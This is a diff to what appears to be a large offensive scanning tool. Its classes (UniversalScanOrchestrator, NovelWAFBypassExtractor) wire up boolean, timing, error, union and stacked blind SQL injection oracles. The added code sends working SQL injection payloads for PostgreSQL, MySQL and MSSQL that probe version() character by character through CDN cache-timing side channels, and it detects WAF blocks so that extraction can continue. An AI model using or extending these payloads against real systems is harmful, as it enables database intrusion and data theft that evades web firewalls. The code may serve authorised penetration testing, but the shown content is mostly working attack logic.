@@ -117470,6 +117470,7 @@ class UniversalScanOrchestrator:
                                             if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                 class _FakeMSE:
                                                     _boolean_oracle = None
+                                                    _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                 _enum._mse_instance = _FakeMSE()
                                             _enum._mse_instance._boolean_oracle = _inline_bool_oracle
                                             print("[+] [V25-Extract] Inline boolean oracle wired "
@@ -117641,6 +117642,7 @@ class UniversalScanOrchestrator:
                                             if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                 class _FakeMSE2:
                                                     _boolean_oracle = None
+                                                    _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                 _enum._mse_instance = _FakeMSE2()
                                             _enum._mse_instance._boolean_oracle = _inline_timing_oracle
                                             print("[+] [V25-Extract] Inline timing oracle wired "
@@ -117774,6 +117776,7 @@ class UniversalScanOrchestrator:
                                                 if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                     class _FakeMSE_E:
                                                         _boolean_oracle = None
+                                                        _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                     _enum._mse_instance = _FakeMSE_E()
                                                 _enum._mse_instance._boolean_oracle = _inline_error_oracle_fb
                                                 _wired_fallback = True
@@ -117905,6 +117908,7 @@ class UniversalScanOrchestrator:
                                                 if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                     class _FakeMSE_U:
                                                         _boolean_oracle = None
+                                                        _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                     _enum._mse_instance = _FakeMSE_U()
                                                 _enum._mse_instance._boolean_oracle = _inline_union_oracle_fb
                                                 _wired_fallback = True
@@ -118099,6 +118103,7 @@ class UniversalScanOrchestrator:
                                                 if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                     class _FakeMSE_S:
                                                         _boolean_oracle = None
+                                                        _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                     _enum._mse_instance = _FakeMSE_S()
                                                 _enum._mse_instance._boolean_oracle = _inline_stacked_oracle_fb
                                                 _wired_fallback = True
@@ -118219,6 +118224,7 @@ class UniversalScanOrchestrator:
                                                 if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
                                                     class _FakeMSE_WB:
                                                         _boolean_oracle = None
+                                                        _oracles = []  # BUG-FAKEMSEWB-NO-ORACLES FIX
                                                     _enum._mse_instance = _FakeMSE_WB()
                                                 _enum._mse_instance._boolean_oracle = _inline_bool_oracle_wb
                                                 _wired_fallback = True
@@ -145969,7 +145975,48 @@ class NovelWAFBypassExtractor:
                     # (fast-path, no cache inference possible) to avoid stalling extraction.
                     _cache_consecutive_errors = 0
                     _co_req = 0  # BUG-V167-NOVEL-CACHE-MISSING-OBFUSCATION FIX: per-probe obfuscation counter
-                    for _pos in range(1, 31):   # cap at 30 chars; version strings are long
+
+                    # BUG-CACHE-ORACLE-PREVALIDATION FIX: verify the oracle can distinguish
+                    # TRUE from FALSE using known conditions before running full extraction.
+                    # Uses ASCII of first byte of version() — always >=32 (TRUE) and never
+                    # >=250 (FALSE) for any real version string.  Skips extraction if signals
+                    # are indistinguishable (e.g. CDN ignores cache headers for this target).
+                    _do_extract = True
+                    try:
+                        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                            _vtp = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=32) THEN md5(random()::text) ELSE version() END"
+                            _vfpl = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=250) THEN md5(random()::text) ELSE version() END"
+                        elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                            _vtp = "IF((ASCII(SUBSTRING(version(),1,1))>=32),MD5(RAND()),VERSION())"
+                            _vfpl = "IF((ASCII(SUBSTRING(version(),1,1))>=250),MD5(RAND()),VERSION())"
+                        elif dbms == "MSSQL":
+                            _vtp = "CASE WHEN (ASCII(SUBSTRING(@@version,1,1))>=32) THEN NEWID() ELSE @@VERSION END"
+                            _vfpl = "CASE WHEN (ASCII(SUBSTRING(@@version,1,1))>=250) THEN NEWID() ELSE @@VERSION END"
+                        else:
+                            _vtp = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=32) THEN MD5(RANDOM()::TEXT) ELSE version() END"
+                            _vfpl = "CASE WHEN (ASCII(SUBSTR(version(),1,1))>=250) THEN MD5(RANDOM()::TEXT) ELSE version() END"
+                        # Prime TRUE condition → should NOT cache (random body) → second send slow
+                        await send_fn(_vtp)
+                        await asyncio.sleep(0.2)
+                        _vt0 = time.monotonic()
+                        await send_fn(_vtp)
+                        _vt_ms = (time.monotonic() - _vt0) * 1000
+                        await asyncio.sleep(0.3)
+                        # Prime FALSE condition → SHOULD cache (deterministic body) → second send fast
+                        await send_fn(_vfpl)
+                        await asyncio.sleep(0.2)
+                        _vt0 = time.monotonic()
+                        await send_fn(_vfpl)
+                        _vf_ms = (time.monotonic() - _vt0) * 1000
+                        print("[+] [Novel] Cache oracle validation: TRUE=%.0fms FALSE=%.0fms threshold=%.0fms" % (
+                            _vt_ms, _vf_ms, _threshold))
+                        if not (_vt_ms > _threshold and _vf_ms <= _threshold):
+                            _do_extract = False
+                            print("[+] [Novel] Cache oracle cannot discriminate TRUE/FALSE — skipping extraction")
+                    except Exception as _vex:
+                        LOG.debug("[Novel] Cache oracle pre-validation: %s", _vex)
+
+                    for _pos in (range(1, 31) if _do_extract else []):   # cap at 30 chars; version strings are long
                         # BUG-V166-NOVEL-CACHE-ORACLE-CHAR-CEILING-126 FIX (MEDIUM, MySQL/PG/MSSQL;
                         # Novel CacheOracle char extraction; all techniques; all surfaces):
                         # Previous bounds _low, _high = 32, 126 silently converted any character
@@ -146108,8 +146155,12 @@ class NovelWAFBypassExtractor:
                             _fp2 = await send_fn(_test_payload_obf)
                             _elapsed = (time.monotonic() - _t0) * 1000
 
-                            # Rate-limit or network error: treat as indeterminate (False)
-                            _blocked = _fp2 is None or getattr(_fp2, 'status_code', 0) == 429
+                            # Rate-limit, WAF block (400/403/429), or network error: treat as indeterminate
+                            # BUG-CACHE-ORACLE-BLOCKED-STATUS FIX: WAF can return 400/403, not only 429
+                            _status1 = getattr(_fp1, 'status_code', 0) if _fp1 else 0
+                            _status2 = getattr(_fp2, 'status_code', 0) if _fp2 else 0
+                            _blocked = (_fp2 is None or _status2 in (400, 403, 429) or
+                                        _status1 in (400, 403, 429))
                             if _blocked:
                                 _cache_consecutive_errors += 1
                                 if _cache_consecutive_errors >= 3:
